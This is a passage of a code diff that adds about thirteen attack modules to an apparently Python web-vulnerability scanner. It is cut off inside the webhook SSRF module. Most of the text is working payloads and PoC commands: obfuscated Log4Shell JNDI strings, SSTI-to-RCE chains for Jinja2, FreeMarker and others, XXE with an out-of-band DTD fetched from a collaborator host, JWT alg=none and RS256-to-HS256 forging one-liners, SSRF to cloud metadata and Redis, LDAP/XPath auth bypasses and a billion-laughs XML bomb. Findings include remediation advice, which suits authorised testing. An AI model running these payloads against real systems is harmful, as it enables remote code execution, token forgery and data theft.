@@ -4892,6 +4892,844 @@ class BlindCMDInjection:
         return profile
 
 # ══════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════
+# TOOLS 106-125 — 20 Black Team Skills (Phase 10)
+# ══════════════════════════════════════════════════════════════
+
+# ── Tool 106: Log4Shell / JNDI Injection (SKILL-116) ──────────
+class Log4ShellScanner:
+    """Inject JNDI payloads into headers to detect Log4j RCE (CVE-2021-44228)."""
+    NAME = "Log4Shell Scanner"
+    # Safe detection payloads — no live LDAP server, only DNS-observable patterns
+    JNDI_HEADERS = [
+        "User-Agent", "X-Forwarded-For", "X-Api-Version",
+        "X-Remote-IP", "X-Remote-Addr", "X-Originating-IP",
+        "Referer", "CF-Connecting-IP", "True-Client-IP",
+        "Accept-Language", "Authorization",
+    ]
+    # Uses a non-routable DNS label — change to your Burp Collaborator / interactsh host
+    JNDI_PAYLOADS = [
+        "${jndi:ldap://log4shell-detect.invalid/a}",
+        "${${::-j}${::-n}${::-d}${::-i}:ldap://log4shell-detect.invalid/a}",
+        "${${lower:j}ndi:ldap://log4shell-detect.invalid/a}",
+        "${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://log4shell-detect.invalid/a}",
+        "${jndi:dns://log4shell-detect.invalid/a}",
+        "${jndi:rmi://log4shell-detect.invalid/a}",
+    ]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        for hdr in self.JNDI_HEADERS[:5]:
+            for pl in self.JNDI_PAYLOADS[:3]:
+                try:
+                    r = _fetch(profile.url, cfg.ua, cfg.timeout,
+                               headers_extra={hdr: pl})
+                    if r and r.body:
+                        body = r.body.decode("utf-8", errors="replace")
+                        # Direct reflection = the server echoed the raw payload (bad sign)
+                        if "${jndi:" in body or "log4shell-detect" in body:
+                            profile.findings.append(Finding(
+                                id="LOG4SHELL-REFLECT",
+                                title=f"Log4Shell JNDI payload reflected in response (CVE-2021-44228)",
+                                severity="CRITICAL",
+                                cvss=10.0,
+                                cwe="CWE-917",
+                                description=f"Header '{hdr}' with JNDI payload was reflected unprocessed in response body — "
+                                            "server may be echoing without lookup. Verify OOB DNS hit with Burp Collaborator.",
+                                poc_curl=(
+                                    f"curl -sk {profile.url} "
+                                    f"-H '{hdr}: ${{jndi:ldap://YOUR_COLLABORATOR/a}}'"
+                                ),
+                                category="RCE",
+                                remediation="Upgrade Log4j to ≥2.17.1. Set log4j2.formatMsgNoLookups=true. Block JNDI lookups at JVM level."
+                            ))
+                            return profile
+                except Exception:
+                    pass
+        # Always emit an informational PoC for OOB testing
+        poc_lines = "\n".join(
+            f"curl -sk {profile.url} -H '{h}: ${{jndi:ldap://COLLAB/{i}}}'"
+            for i, h in enumerate(self.JNDI_HEADERS[:5]))
+        profile.findings.append(Finding(
+            id="LOG4SHELL-OOB-POC",
+            title="Log4Shell OOB PoC generated — requires Burp Collaborator / interactsh",
+            severity="INFO",
+            cvss=0.0,
+            cwe="CWE-917",
+            description=(
+                "JNDI payloads were sent in 5 common headers. No server-side reflection "
+                "detected passively. Use Burp Collaborator to observe DNS/HTTP callbacks."
+            ),
+            poc_curl=poc_lines,
+            category="RCE",
+            remediation="Upgrade Log4j to ≥2.17.1. Remove log4j from all JVM-based services. Block outbound LDAP/RMI."
+        ))
+        return profile
+
+# ── Tool 107: XPath Injection (SKILL-117) ─────────────────────
+class XPathInjection:
+    """Detect XPath injection in login and search parameters."""
+    NAME = "XPath Injection"
+    XPATH_PAYLOADS = [
+        ("' or '1'='1", "boolean bypass"),
+        ("' or 1=1 or ''='", "boolean bypass 2"),
+        ("x' or name()='username' or 'x'='y", "name() extract"),
+        ("' or count(/*)>0 or '", "count probe"),
+        ("admin' or '1'='1", "auth bypass"),
+        ("' or substring(name(/*[1]),1,1)='a' or '", "blind enum"),
+    ]
+    PARAMS = [("username", "password"), ("user", "pass"),
+              ("login", "pwd"), ("email", "password"), ("q", None)]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        for (p1, p2) in self.PARAMS[:4]:
+            for pl, label in self.XPATH_PAYLOADS[:4]:
+                # POST form
+                body_data = f"{p1}={pl}&{p2 or 'pass'}=test".encode() if p2 else f"{p1}={pl}".encode()
+                try:
+                    r = _fetch(profile.url, cfg.ua, cfg.timeout, "POST", body_data,
+                               {"Content-Type": "application/x-www-form-urlencoded"})
+                    if not r:
+                        continue
+                    resp_body = r.body.decode("utf-8", errors="replace") if r.body else ""
+                    if any(sig in resp_body.lower() for sig in
+                           ["xpath", "xmlpath", "unterminated string",
+                            "invalid predicate", "namespace"]):
+                        profile.findings.append(Finding(
+                            id="XPATH-INJECT",
+                            title=f"XPath injection via '{p1}' parameter ({label})",
+                            severity="HIGH",
+                            cvss=8.1,
+                            cwe="CWE-643",
+                            description=f"XPath error keywords appeared in response after injecting '{pl}' into '{p1}'. Possible XPath data store.",
+                            poc_curl=(
+                                f"curl -sk -X POST {profile.url} "
+                                f"-d \"{p1}={pl}&{p2 or 'pass'}=test\""
+                            ),
+                            category="Injection",
+                            remediation="Use parameterized XPath queries. Never concatenate user input into XPath expressions."
+                        ))
+                        return profile
+                except Exception:
+                    pass
+        return profile
+
+# ── Tool 108: LDAP Injection (SKILL-118) ──────────────────────
+class LDAPInjection:
+    """Detect LDAP injection in authentication and directory search endpoints."""
+    NAME = "LDAP Injection"
+    LDAP_PAYLOADS = [
+        ("*)(uid=*", "wildcard bypass"),
+        ("*)(|(uid=*", "OR injection"),
+        ("admin)(&(password=x", "AND bypass"),
+        ("*))%00", "null byte termination"),
+        ("*()|&'", "special chars"),
+        ("admin))(|(cn=*", "nested OR"),
+    ]
+    PARAMS = ["username", "user", "login", "email", "uid", "search", "q", "cn"]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        LDAP_ERR = re.compile(
+            r'ldap|javax\.naming|NamingException|invalid attribute|'
+            r'ldap_search|Bad search filter|Size limit|sizelimit', re.I)
+        for param in self.PARAMS[:5]:
+            for pl, label in self.LDAP_PAYLOADS[:4]:
+                url = profile.url.rstrip("/") + f"/?{param}={pl}"
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout)
+                    if not r:
+                        continue
+                    resp_body = r.body.decode("utf-8", errors="replace") if r.body else ""
+                    if LDAP_ERR.search(resp_body):
+                        profile.findings.append(Finding(
+                            id="LDAP-INJECT",
+                            title=f"LDAP injection via parameter '{param}' ({label})",
+                            severity="HIGH",
+                            cvss=8.8,
+                            cwe="CWE-90",
+                            description=f"LDAP error keywords in response for payload '{pl}' on '{param}'. Indicates unsanitized LDAP filter construction.",
+                            poc_curl=f"curl -sk '{url}'",
+                            category="Injection",
+                            remediation="Escape LDAP special chars: ( ) * \\ NUL. Use LDAP SDK parameterized search filters."
+                        ))
+                        return profile
+                except Exception:
+                    pass
+        return profile
+
+# ── Tool 109: SSI / Edge-Side Include Injection (SKILL-119) ───
+class SSIInjection:
+    """Detect Server-Side Include and Edge-Side Include injection."""
+    NAME = "SSI/ESI Injection"
+    SSI_PAYLOADS = [
+        "<!--#echo var=\"DATE_LOCAL\" -->",
+        "<!--#exec cmd=\"echo ssi-test-apex\" -->",
+        "<!--#include virtual=\"/etc/passwd\" -->",
+        "<!--#printenv -->",
+    ]
+    ESI_PAYLOADS = [
+        "<esi:include src=\"http://169.254.169.254/\" />",
+        "<esi:include src=\"/etc/passwd\" />",
+        "<esi:vars>$(HTTP_COOKIE)</esi:vars>",
+    ]
+    PARAMS = ["name", "message", "comment", "content", "text", "q", "search", "body"]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        SSI_MARKERS = ["ssi-test-apex", "root:", "DATE_LOCAL", "SERVER_SOFTWARE",
+                       "HTTP_HOST", "DOCUMENT_ROOT"]
+        for param in self.PARAMS[:5]:
+            for pl in (self.SSI_PAYLOADS + self.ESI_PAYLOADS)[:4]:
+                url = profile.url.rstrip("/") + f"/?{param}={pl}"
+                try:
+                    r = _fetch(url, cfg.ua, cfg.timeout)
+                    if not r:
+                        continue
+                    body = r.body.decode("utf-8", errors="replace") if r.body else ""
+                    for marker in SSI_MARKERS:
+                        if marker in body and pl not in body:
+                            label = "SSI" if "<!--#" in pl else "ESI"
+                            profile.findings.append(Finding(
+                                id=f"{label}-INJECT",
+                                title=f"{label} injection via '{param}' parameter",
+                                severity="CRITICAL",
+                                cvss=9.8,
+                                cwe="CWE-97",
+                                description=f"{label} payload executed: marker '{marker}' appeared in response. Payload: {pl[:60]}",
+                                poc_curl=f"curl -sk '{url}'",
+                                category="Injection",
+                                remediation=f"Disable {label} processing. Never render user input through server-side include engines."
+                            ))
+                            return profile
+                except Exception:
+                    pass
+        return profile
+
+# ── Tool 110: PDF / HTML-to-PDF SSRF (SKILL-120) ─────────────
+class PDFGeneratorSSRF:
+    """Detect SSRF and file-read via PDF/export generation endpoints."""
+    NAME = "PDF Generator SSRF"
+    PDF_PATHS = [
+        "/api/export/pdf", "/api/pdf", "/pdf", "/export",
+        "/api/export", "/print", "/api/print",
+        "/api/report/pdf", "/api/generate",
+        "/api/screenshot", "/api/render",
+    ]
+    SSRF_PAYLOADS = [
+        "http://169.254.169.254/latest/meta-data/",
+        "file:///etc/passwd",
+        "file:///proc/self/environ",
+        "http://localhost/server-status",
+        "dict://localhost:11211/stat",
+        "gopher://localhost:6379/_INFO%0a",
+    ]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        for path in self.PDF_PATHS:
+            url = profile.url.rstrip("/") + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if not r or r.status not in (200, 400, 405, 422):
+                    continue
+                # Endpoint exists — generate SSRF PoC
+                poc_lines = []
+                for pl in self.SSRF_PAYLOADS:
+                    for param in ["url", "src", "source", "target", "html", "content"]:
+                        poc_lines.append(
+                            f"curl -sk -X POST {url} -H 'Content-Type: application/json' "
+                            f"-d '{{\"url\":\"{pl}\",\"{param}\":\"{pl}\"}}'"
+                        )
+                profile.findings.append(Finding(
+                    id=f"PDF-SSRF-{path.replace('/','_')[:15].upper()}",
+                    title=f"PDF/export generator endpoint exposed: {path}",
+                    severity="HIGH",
+                    cvss=8.6,
+                    cwe="CWE-918",
+                    description=(
+                        f"PDF/export endpoint {url} responded with HTTP {r.status}. "
+                        "These endpoints commonly use headless Chromium or wkhtmltopdf which "
+                        "can fetch arbitrary URLs — test for SSRF and local file read."
+                    ),
+                    poc_curl="\n".join(poc_lines[:3]),
+                    category="SSRF",
+                    remediation="Sanitize URL inputs to PDF renderers. Block access to internal networks from renderer process. Use a dedicated sandbox."
+                ))
+            except Exception:
+                pass
+        return profile
+
+# ── Tool 111: JWT Algorithm Confusion RS256→HS256 (SKILL-121) ─
+class JWTAlgorithmConfusion:
+    """Forge JWT tokens using RS256→HS256 algorithm confusion attack."""
+    NAME = "JWT Algorithm Confusion"
+    JWT_HDR_PAT = re.compile(
+        r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]*')
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        # Phase 1: locate a JWT in a well-known response
+        for path in ["/api/me", "/api/token", "/api/auth/token",
+                     "/oauth/token", "/.well-known/openid-configuration"]:
+            url = profile.url.rstrip("/") + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if not r:
+                    continue
+                body = r.body.decode("utf-8", errors="replace") if r.body else ""
+                auth_hdr = r.headers.get("authorization", "") + r.headers.get("www-authenticate", "")
+                candidate = self.JWT_HDR_PAT.search(body) or self.JWT_HDR_PAT.search(auth_hdr)
+                if candidate:
+                    token = candidate.group(0)
+                    # Decode header to check algorithm
+                    import base64 as _b64
+                    hdr_b64 = token.split(".")[0]
+                    hdr_b64 += "=" * (-len(hdr_b64) % 4)
+                    try:
+                        hdr = json.loads(_b64.urlsafe_b64decode(hdr_b64).decode())
+                    except Exception:
+                        hdr = {}
+                    alg = hdr.get("alg", "unknown")
+                    if alg.startswith("RS") or alg.startswith("ES"):
+                        profile.findings.append(Finding(
+                            id="JWT-ALG-CONFUSION",
+                            title=f"JWT uses asymmetric algorithm ({alg}) — test RS256→HS256 confusion",
+                            severity="HIGH",
+                            cvss=8.8,
+                            cwe="CWE-327",
+                            description=(
+                                f"JWT with alg={alg} found at {path}. "
+                                "Algorithm confusion attack: sign a forged token with HS256 using the server's RSA public key as the HMAC secret. "
+                                "If the server trusts both RS256 and HS256, it will verify the forged token using the public key."
+                            ),
+                            poc_curl=(
+                                f"# 1. Fetch public key: curl -sk {profile.url}/.well-known/jwks.json\n"
+                                f"# 2. Forge with python-jwt:\n"
+                                f"#    python3 -c \"import jwt,base64; pub=open('pub.pem').read(); "
+                                f"print(jwt.encode({{'sub':'admin','role':'admin'}}, pub, algorithm='HS256'))\"\n"
+                                f"# 3. Send forged token: curl -sk {url} -H 'Authorization: Bearer FORGED'"
+                            ),
+                            category="Authentication",
+                            remediation="Enforce a single allowed algorithm per key. Reject HS256 tokens when using RS256. Use `algorithms=['RS256']` explicitly in JWT verification."
+                        ))
+                    elif alg == "none":
+                        profile.findings.append(Finding(
+                            id="JWT-ALG-NONE",
+                            title="JWT with alg=none accepted — signature bypass",
+                            severity="CRITICAL",
+                            cvss=9.8,
+                            cwe="CWE-347",
+                            description=f"JWT found at {path} with alg=none. Server may accept unsigned tokens.",
+                            poc_curl=(
+                                f"# Forge unsigned token:\n"
+                                f"python3 -c \""
+                                f"import base64,json; "
+                                f"h=base64.urlsafe_b64encode(json.dumps({{'alg':'none','typ':'JWT'}}).encode()).rstrip(b'=').decode(); "
+                                f"p=base64.urlsafe_b64encode(json.dumps({{'sub':'admin','role':'admin'}}).encode()).rstrip(b'=').decode(); "
+                                f"print(f'{{h}}.{{p}}.')\""
+                            ),
+                            category="Authentication",
+                            remediation="Reject tokens with alg=none. Whitelist exactly one algorithm per application context."
+                        ))
+                    return profile
+            except Exception:
+                pass
+        return profile
+
+# ── Tool 112: Blind XXE via OOB DNS (SKILL-122) ───────────────
+class BlindXXEOOB:
+    """Generate OOB blind XXE payloads targeting DTD-loading XML parsers."""
+    NAME = "Blind XXE OOB"
+    XML_ENDPOINTS = [
+        "/api/import", "/api/upload", "/api/xml", "/api/parse",
+        "/soap", "/ws", "/api/soap", "/api/webhook",
+        "/api/feed", "/api/rss", "/api/atom",
+        "/api/sitemap.xml",
+    ]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        XXE_PAYLOADS = [
+            # Classic XXE file read
+            ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+             '<root>&xxe;</root>'),
+            # OOB DTD load (replace COLLAB with Burp Collaborator)
+            ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://COLLAB/xxe.dtd">%dtd;]>'
+             '<root/>'),
+            # SVG XXE vector
+            ('<svg xmlns="http://www.w3.org/2000/svg">'
+             '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+             '<text>&xxe;</text></svg>'),
+        ]
+        CONTENT_TYPES = [
+            "application/xml", "text/xml", "application/atom+xml",
+            "application/rss+xml", "image/svg+xml",
+        ]
+        for path in self.XML_ENDPOINTS:
+            url = profile.url.rstrip("/") + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 400, 405, 415, 422):
+                    for ct in CONTENT_TYPES[:2]:
+                        poc = XXE_PAYLOADS[0]
+                        profile.findings.append(Finding(
+                            id=f"XXE-OOB-{path.replace('/','_')[:15].upper()}",
+                            title=f"XML endpoint exposed — blind XXE OOB payloads generated: {path}",
+                            severity="HIGH",
+                            cvss=8.6,
+                            cwe="CWE-611",
+                            description=(
+                                f"Endpoint {url} accepts XML ({r.status}). "
+                                "Replace COLLAB with your Burp Collaborator host for OOB exfiltration. "
+                                "Classic file-read payload also generated."
+                            ),
+                            poc_curl=(
+                                f"curl -sk -X POST {url} -H 'Content-Type: {ct}' "
+                                f"--data-binary '{XXE_PAYLOADS[1]}'"
+                            ),
+                            category="XXE",
+                            remediation="Disable external entity processing. Use defusedxml. Set FEATURE_EXTERNAL_GENERAL_ENTITIES=false."
+                        ))
+                        break
+            except Exception:
+                pass
+        return profile
+
+# ── Tool 113: SSTI → RCE Chain (SKILL-123) ───────────────────
+class SSTIRCEChain:
+    """Test SSTI payloads that escalate to RCE via class hierarchy traversal."""
+    NAME = "SSTI RCE Chain"
+    # Detection polyglot — safe expression, just evaluates math
+    DETECT_PAYLOAD = "${7777+1}{{7777+1}}#{7777+1}*{7777+1}@(7777+1)"
+    RCE_PAYLOADS = {
+        "Jinja2":    "{{config.__class__.__init__.__globals__['os'].popen('echo APEX_RCE').read()}}",
+        "Twig":      "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('echo APEX_RCE')}}",
+        "FreeMarker": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"echo APEX_RCE\")}",
+        "Velocity":  "#set($e=\"\")#set($x=$e.class.forName(\"java.lang.Runtime\").getMethod(\"exec\",\"echo APEX_RCE\".class))",
+        "Pebble":    "{% set os = 'java.lang.Runtime' | classLoading %}",
+        "Mvel":      "new java.util.Scanner(Runtime.getRuntime().exec(new String[]{\"id\"}).getInputStream()).useDelimiter(\"\\\\A\").next()",
+    }
+    PARAMS = ["name", "template", "query", "message", "subject", "greeting",
+              "title", "content", "text", "username", "search"]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        for param in self.PARAMS[:6]:
+            url = profile.url.rstrip("/") + f"/?{param}={self.DETECT_PAYLOAD}"
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if not r:
+                    continue
+                body = r.body.decode("utf-8", errors="replace") if r.body else ""
+                if "7778" in body:
+                    engine = "Unknown"
+                    if "{{7777+1}}" not in body and "7778" in body:
+                        engine = "Jinja2/Twig"
+                    elif "${7777+1}" not in body and "7778" in body:
+                        engine = "FreeMarker/Velocity"
+                    profile.findings.append(Finding(
+                        id="SSTI-RCE-CHAIN",
+                        title=f"SSTI → RCE chain — expression evaluated in '{param}' ({engine})",
+                        severity="CRITICAL",
+                        cvss=10.0,
+                        cwe="CWE-94",
+                        description=(
+                            f"Math expression 7777+1=7778 evaluated in parameter '{param}'. "
+                            f"Detected engine hint: {engine}. "
+                            "RCE payload chain provided below — confirm manually."
+                        ),
+                        poc_curl="\n".join(
+                            f"# {eng}: curl -sk '{profile.url}/?{param}={pl}'"
+                            for eng, pl in self.RCE_PAYLOADS.items()
+                        ),
+                        category="RCE",
+                        remediation="Use sandboxed template engines. Never pass user input to template rendering functions. Enforce strict mode with no class access."
+                    ))
+                    return profile
+            except Exception:
+                pass
+        return profile
+
+# ── Tool 114: Cache Poisoning Advanced (SKILL-124) ───────────
+class CachePoisoningAdvanced:
+    """Detect advanced cache poisoning: fat GET, unkeyed cookies, parameter cloaking."""
+    NAME = "Cache Poisoning Advanced"
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        tests = [
+            # Fat GET: body in GET request
+            {
+                "label": "fat-GET",
+                "method": "GET",
+                "body": b"injected=apexpoison",
+                "headers": {"Content-Type": "application/x-www-form-urlencoded",
+                            "Content-Length": "19"},
+            },
+            # Unkeyed cookie injection
+            {
+                "label": "unkeyed-cookie",
+                "method": "GET",
+                "body": None,
+                "headers": {"Cookie": "poison=apexpoison; session=legit"},
+            },
+            # X-Original-URL cache key normalisation
+            {
+                "label": "x-original-url",
+                "method": "GET",
+                "body": None,
+                "headers": {"X-Original-URL": "/apexpoison"},
+            },
+            # Parameter cloaking via semicolons
+            {
+                "label": "param-cloak",
+                "method": "GET",
+                "body": None,
+                "headers": {},
+                "url_suffix": ";apexpoison=1",
+            },
+        ]
+        for test in tests:
+            url = profile.url + test.get("url_suffix", "")
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout, test["method"],
+                           test.get("body"), test.get("headers", {}))
+                if not r:
+                    continue
+                body = r.body.decode("utf-8", errors="replace") if r.body else ""
+                cc = r.headers.get("cache-control", "")
+                via = r.headers.get("via", "") + r.headers.get("x-cache", "")
+                if "apexpoison" in body:
+                    profile.findings.append(Finding(
+                        id=f"CACHE-POISON-ADV-{test['label'].upper()}",
+                        title=f"Advanced cache poisoning — '{test['label']}' reflected in response",
+                        severity="HIGH",
+                        cvss=8.2,
+                        cwe="CWE-345",
+                        description=f"Unkeyed input '{test['label']}' was reflected in response body. Cache-Control: {cc}, Via: {via}.",
+                        poc_curl=f"curl -sk -X {test['method']} '{url}' " +
+                                 " ".join(f"-H '{k}: {v}'" for k,v in test.get("headers",{}).items()),
+                        category="Cache",
+                        remediation="Ensure all user-controlled inputs are keyed in the cache key or stripped at the CDN edge."
+                    ))
+            except Exception:
+                pass
+        return profile
+
+# ── Tool 115: OAuth Token Referer Leakage (SKILL-125) ────────
+class OAuthTokenRefererLeak:
+    """Detect OAuth access tokens leaking via Referer to third-party resources."""
+    NAME = "OAuth Token Referer Leak"
+    OAUTH_CALLBACK_PATHS = [
+        "/oauth/callback", "/auth/callback", "/oauth2/callback",
+        "/api/oauth/callback", "/connect/callback",
+        "/auth/redirect", "/oauth/redirect",
+    ]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        for path in self.OAUTH_CALLBACK_PATHS:
+            url = profile.url.rstrip("/") + path
+            try:
+                r = _fetch(url + "?code=test&state=test", cfg.ua, cfg.timeout)
+                if not r:
+                    continue
+                body = r.body.decode("utf-8", errors="replace") if r.body else ""
+                loc = r.headers.get("location", "")
+                # If callback returns a page that loads third-party resources
+                # with a token in the URL, the Referer header will leak the token
+                third_party = re.findall(
+                    r'src=["\']https?://(?!' + re.escape(profile.host) + r')[^"\']+["\']',
+                    body, re.I)
+                token_in_url = re.search(
+                    r'[?&#](?:access_token|token|code)=[A-Za-z0-9_\-\.]{10,}', loc)
+                if third_party and token_in_url:
+                    profile.findings.append(Finding(
+                        id="OAUTH-REFERER-LEAK",
+                        title="OAuth token leaks via Referer to third-party resource",
+                        severity="HIGH",
+                        cvss=7.4,
+                        cwe="CWE-598",
+                        description=(
+                            f"OAuth callback at {path} places token in URL ({loc[:80]}) "
+                            f"then loads third-party resources: {third_party[0][:60]}. "
+                            "The browser sends the token-bearing URL as Referer to the third party."
+                        ),
+                        poc_curl=f"curl -sk -v '{url}?code=test&state=test' 2>&1 | grep -i location",
+                        category="OAuth",
+                        remediation="Use fragment (#) instead of query string for tokens. Clear token from URL after exchange. Use strict Referrer-Policy: no-referrer."
+                    ))
+                elif r.status in (200, 302):
+                    profile.findings.append(Finding(
+                        id=f"OAUTH-CALLBACK-EXPOSED-{path.replace('/','_')[:15].upper()}",
+                        title=f"OAuth callback endpoint exposed: {path}",
+                        severity="INFO",
+                        cvss=0.0,
+                        cwe="CWE-598",
+                        description=f"OAuth callback {url} responded {r.status}. Manually test for token-in-Referer leakage with third-party resources on the callback page.",
+                        poc_curl=f"curl -sk -v '{url}?code=test&state=test' 2>&1 | grep -iE 'location|referer'",
+                        category="OAuth",
+                        remediation="Audit all resources loaded on the OAuth callback page for third-party origins."
+                    ))
+            except Exception:
+                pass
+        return profile
+
+# ── Tool 116: SOAP / XML Injection (SKILL-126) ────────────────
+class SOAPXMLInjection:
+    """Detect SOAP endpoints and test for XML injection, entity expansion, and schema attacks."""
+    NAME = "SOAP/XML Injection"
+    SOAP_PATHS = ["/ws", "/soap", "/api/soap", "/service", "/services",
+                  "/webservice", "/webservices", "/wsdl", "/api/wsdl",
+                  "/?wsdl", "/?WSDL", "/api?wsdl"]
+    SOAP_PROBE = b"""<?xml version="1.0" encoding="UTF-8"?>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Body>
+    <test><![CDATA[<inject/>]]></test>
+  </soapenv:Body>
+</soapenv:Envelope>"""
+    BILLION_LAUGHS = b"""<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;">
+]>
+<lolz>&lol3;</lolz>"""
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        for path in self.SOAP_PATHS:
+            url = profile.url.rstrip("/") + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 400, 405, 415, 500):
+                    body = (r.body or b"").decode("utf-8", errors="replace")
+                    is_soap = any(k in body.lower() for k in
+                                  ["wsdl", "soap", "envelope", "definitions", "porttype"])
+                    if not is_soap and r.status not in (200,):
+                        continue
+                    # Test CDATA injection
+                    r2 = _fetch(url, cfg.ua, cfg.timeout, "POST", self.SOAP_PROBE,
+                                {"Content-Type": "text/xml; charset=utf-8",
+                                 "SOAPAction": '""'})
+                    inject_sig = False
+                    if r2 and r2.body:
+                        b2 = r2.body.decode("utf-8", errors="replace")
+                        inject_sig = "<inject" in b2 or "CDATA" in b2
+                    profile.findings.append(Finding(
+                        id=f"SOAP-INJECT-{path.replace('/','_')[:15].upper()}",
+                        title=f"SOAP/XML endpoint exposed: {path}" + (" — CDATA reflected" if inject_sig else ""),
+                        severity="HIGH" if inject_sig else "MEDIUM",
+                        cvss=8.1 if inject_sig else 5.3,
+                        cwe="CWE-91",
+                        description=(
+                            f"SOAP endpoint {url} responded {r.status}. "
+                            + ("CDATA injection reflected in response. " if inject_sig else "")
+                            + "Also test for Billion Laughs (XML bomb) and external entity attacks."
+                        ),
+                        poc_curl=(
+                            f"curl -sk -X POST {url} -H 'Content-Type: text/xml' "
+                            f"-H 'SOAPAction: \"\"' --data-binary @soap_inject.xml"
+                        ),
+                        category="Injection",
+                        remediation="Disable DTD processing. Validate SOAP schema strictly. Use an XML firewall for SOAP services."
+                    ))
+            except Exception:
+                pass
+        return profile
+
+# ── Tool 117: PHP Type Juggling (SKILL-127) ───────────────────
+class PHPTypeJuggling:
+    """Detect PHP loose comparison vulnerabilities: 0e hashes, null==false, array bypass."""
+    NAME = "PHP Type Juggling"
+    JUGGLE_PAYLOADS = [
+        # 0e magic hash — MD5("240610708") = 0e... → equals 0 in PHP
+        ("password", "240610708", "0e magic hash"),
+        ("password", "QNKCDZO",   "0e magic hash 2"),
+        ("token",    "0",         "loose int comparison"),
+        ("hash",     "0e1",       "scientific notation zero"),
+        ("role",     "0",         "0==admin in loose PHP"),
+        ("id",       "true",      "bool coercion"),
+        ("id",       "null",      "null coercion"),
+    ]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        for param, val, label in self.JUGGLE_PAYLOADS[:6]:
+            url = profile.url.rstrip("/") + f"/?{param}={val}"
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if not r:
+                    continue
+                body = r.body.decode("utf-8", errors="replace") if r.body else ""
+                baseline = _fetch(profile.url.rstrip("/") + f"/?{param}=invalidvalue_xyz", cfg.ua, cfg.timeout)
+                if not baseline:
+                    continue
+                base_body = baseline.body.decode("utf-8", errors="replace") if baseline.body else ""
+                # If response with juggle payload differs significantly from baseline
+                if r.status == 200 and baseline.status != 200:
+                    profile.findings.append(Finding(
+                        id=f"PHP-JUGGLE-{label.replace(' ','_').upper()[:15]}",
+                        title=f"PHP type juggling — '{param}'='{val}' bypassed check ({label})",
+                        severity="HIGH",
+                        cvss=8.1,
+                        cwe="CWE-843",
+                        description=f"Parameter '{param}'='{val}' ({label}) returned 200 while invalid value returned {baseline.status}. Possible loose PHP comparison bypass.",
+                        poc_curl=f"curl -sk '{url}'",
+                        category="Authentication",
+                        remediation="Use strict comparison (===) everywhere. Hash passwords with password_hash(). Never compare hashes with ==."
+                    ))
+            except Exception:
+                pass
+        return profile
+
+# ── Tool 118: Webhook / Callback SSRF (SKILL-128) ─────────────
+class WebhookSSRF:
+    """Detect SSRF via webhook, callback URL, and notification endpoint parameters."""
+    NAME = "Webhook SSRF"
+    WEBHOOK_PATHS = [
+        "/api/webhooks", "/api/webhook", "/api/notifications",
+        "/api/callbacks", "/api/callback", "/api/integrations",
+        "/api/subscriptions", "/api/subscribe", "/api/hooks",
+    ]
+    WEBHOOK_PARAMS = ["url", "callback", "callback_url", "webhook",
+                      "webhook_url", "notify", "notify_url", "endpoint",
+                      "target", "destination", "redirect_url"]
+    SSRF_TARGETS = [
+        ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
+        ("http://localhost/server-status", "localhost"),
+        ("http://127.0.0.1:6379/", "Redis"),
+        ("http://127.0.0.1:8080/", "internal-8080"),
+        ("http://[::1]/", "IPv6 localhost"),
+        ("http://0.0.0.0:22/", "SSH service"),
+    ]
+    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
+        for path in self.WEBHOOK_PATHS:
+            url = profile.url.rstrip("/") + path
+            try:
+                r = _fetch(url, cfg.ua, cfg.timeout)
+                if r and r.status in (200, 201, 400, 405, 422):
+                    poc_lines = []
+                    for ssrf_url, label in self.SSRF_TARGETS[:3]:
+                        for param in self.WEBHOOK_PARAMS[:3]:
+                            poc_lines.append(
+                                f"# {label}: curl -sk -X POST {url} "
+                                f"-H 'Content-Type: application/json' "
+                                f"-d '{{\"url\":\"{ssrf_url}\",\"{param}\":\"{ssrf_url}\"}}'"
+                            )
+                    profile.findings.append(Finding(
+                        id=f"WEBHOOK-SSRF-{path.replace('/','_')[:15].upper()}",
+                        title=f"Webhook endpoint exposed — SSRF via callback URL: {path}",
+                        severity="HIGH",
+                        cvss=8.6,
+                        cwe="CWE-918",
+                        description=(
+                            f"Webhook/callback endpoint {url} responded {r.status}. "
+                            "If user-supplied URLs are fetched server-side without validation, "
